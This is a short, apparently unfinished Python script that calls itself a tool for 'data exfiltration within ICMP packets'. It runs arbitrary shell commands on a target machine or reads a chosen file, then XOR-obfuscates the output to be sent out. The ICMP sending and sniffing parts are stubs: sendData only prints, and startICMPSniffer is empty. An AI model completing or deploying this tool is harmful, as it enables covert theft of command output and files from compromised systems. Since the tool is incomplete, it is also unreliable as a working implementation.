#!/usr/bin/env python3

from scapy.all import *
import argparse as ap
import subprocess
import random as rd
import string

def collectData(command, file):
	data = None
	if command != None:
		cmdresult = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		data = (cmdresult.stdout.read()).decode('utf-8')+'\n\n'+(cmdresult.stderr.read()).decode('utf-8')
	if file != None:
		with open(file, 'r') as f:
			data = f.read()
	return data

def XOREncode(data, key):
	xoreddata = ''.join(chr(ord(charData) ^ ord(key[idxData%len(key)])) for idxData, charData in enumerate(data))
	return xoreddata

def sendData(data):
	print(data)

def clientMode(command, file, key):
	data = collectData(command, file)
	if data != None:
		xoreddata = XOREncode(data, key)
		sendData(xoreddata)
	else:
		print('Nothing to send. Aborting operation...')
		exit(1)

def serverMode():
	key = keyGen()
	print('Use this password to XOR the data: ' + key)

def keyGen():
	key = ''.join(rd.choice(string.ascii_letters + string.digits) for _ in range(20))
	return key

def startICMPSniffer():
	pass

def main():
	parser = ap.ArgumentParser(description="Data exfiltration within ICMP packets.")
	parser.add_argument('mode', help='Mode of operation: client or server')
	group = parser.add_mutually_exclusive_group()
	group.add_argument('-c', '--command', default=None, help='A command to be executed in the target machine')
	group.add_argument('-f', '--file', default=None, help='The full path of a file to exfiltrate.')
	parser.add_argument('-k', '--key', help='The key to be used in client mode.')

	args = parser.parse_args()

	if args.mode.lower() == 'client':
		clientMode(args.command, args.file, args.key)
	elif args.mode.lower() == 'server':
		serverMode()
	else:
		parser.print_help()
		exit(1)

if __name__ == '__main__':
	main()
